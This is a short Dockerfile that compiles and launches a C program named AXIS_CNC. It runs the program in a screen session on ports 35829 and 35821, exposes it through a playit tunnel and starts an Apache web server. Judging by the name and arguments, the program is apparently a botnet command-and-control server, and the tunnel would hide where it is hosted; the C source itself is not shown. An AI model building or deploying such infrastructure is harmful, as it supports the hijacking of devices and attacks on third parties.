FROM ubuntu:latest

RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y tzdata screen gcc gnupg gnupg1 gnupg2 curl tmux && \
    ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime && \
    dpkg-reconfigure --frontend noninteractive tzdata

RUN curl -SsL https://playit-cloud.github.io/ppa/key.gpg | apt-key add -
RUN curl -SsL -o /etc/apt/sources.list.d/playit-cloud.list https://playit-cloud.github.io/ppa/playit-cloud.list

RUN apt-get update && \
    apt-get install -y playit apache2 && \
    gcc -o AXIS /app/AXIS_CNC.c -pthread

CMD screen -S AXIS_session -d -m "./AXIS 35829 1 35821" && \
    tmux new-session -d -s playit_session "playit" && \
    service apache2 start && \
    tmux attach-session -t playit_session
